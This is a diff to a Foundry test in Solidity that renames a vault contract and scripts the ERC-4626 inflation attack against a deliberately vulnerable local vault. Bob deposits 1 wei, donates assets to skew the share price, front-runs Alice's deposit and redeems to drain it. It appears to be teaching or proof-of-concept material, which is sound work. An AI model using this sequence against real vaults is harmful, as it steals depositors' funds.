@@ -3,8 +3,8 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "src/Token/EIP-4626-inflation-attack/Asset.sol";
-import "src/Token/EIP-4626-inflation-attack/Valout.sol";
-import "src/Token/EIP-4626-inflation-attack/VulnerableValout.sol";
+import "src/Token/EIP-4626-inflation-attack/Vault.sol";
+import "src/Token/EIP-4626-inflation-attack/VulnerableVault.sol";
 
 // https://ethereum-magicians.org/t/address-eip-4626-inflation-attacks-with-virtual-shares-and-assets/12677
 
@@ -26,11 +26,11 @@ contract Attack is Test {
     address bob = 0xaFfa4F2906fb9315331943837773d19bC0804601;
 
     IERC20 asset;
-    IERC4626 valout;
+    IERC4626 vault;
 
     function setUp() public {
         asset = new Asset(3 ether);
-        valout = new VulnerableValout(asset);
+        vault = new VulnerableVault(asset);
         asset.transfer(bob, 2 ether);
         asset.transfer(alice, 1 ether);
     }
@@ -40,17 +40,17 @@ contract Attack is Test {
         console.log("Initial Alice asset balance", asset.balanceOf(alice));
 
         // Alice check the price
-        console.log("Price that Alice sees:", valout.convertToShares(1 ether));
+        console.log("Price that Alice sees:", vault.convertToShares(1 ether));
 
         /* Front Running tx */
         vm.startPrank(bob);
 
         // Bob deposits 1 wei of asset
-        asset.approve(address(valout), 1);
-        valout.deposit(1, bob);
+        asset.approve(address(vault), 1);
+        vault.deposit(1, bob);
         // Bob donates 1 token asset (1e18 wei) to manipulate the price of the share
-        asset.transfer(address(valout), 1 ether);
-        console.log("Price after bob manipulation", valout.convertToShares(1 ether));
+        asset.transfer(address(vault), 1 ether);
+        console.log("Price after bob manipulation", vault.convertToShares(1 ether));
 
         vm.stopPrank();
 
@@ -58,15 +58,15 @@ contract Attack is Test {
         vm.startPrank(alice);
 
         // Alice deposit
-        asset.approve(address(valout), 1 ether);
-        valout.deposit(1 ether, alice);
+        asset.approve(address(vault), 1 ether);
+        vault.deposit(1 ether, alice);
 
         vm.stopPrank();
 
         /* Bob drains all assets from the contract */
         vm.startPrank(bob);
 
-        valout.redeem(1 wei, bob, bob);
+        vault.redeem(1 wei, bob, bob);
 
         vm.stopPrank();
 
